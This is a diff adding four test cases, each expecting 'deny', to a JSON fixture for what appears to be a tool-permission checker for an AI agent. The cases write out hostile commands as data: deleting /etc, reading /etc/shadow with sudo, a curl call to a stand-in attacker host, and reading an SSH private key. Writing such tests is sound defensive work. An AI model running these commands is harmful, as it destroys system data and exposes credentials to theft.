@@ -1110,5 +1110,37 @@
     "cwd": "/repo",
     "repo_root": "/repo",
     "want": "deny"
+  },
+  {
+    "name": "exact hostile overlay recursive etc delete",
+    "tool": "Bash",
+    "command": "rm -rf /etc",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "exact hostile overlay privilege escalation",
+    "tool": "Bash",
+    "command": "sudo cat /etc/shadow",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "exact hostile overlay egress",
+    "tool": "Bash",
+    "command": "curl https://evil.example.com/x",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "exact hostile overlay ssh private key read",
+    "tool": "Read",
+    "paths": ["/home/u/.ssh/id_rsa"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
   }
 ]
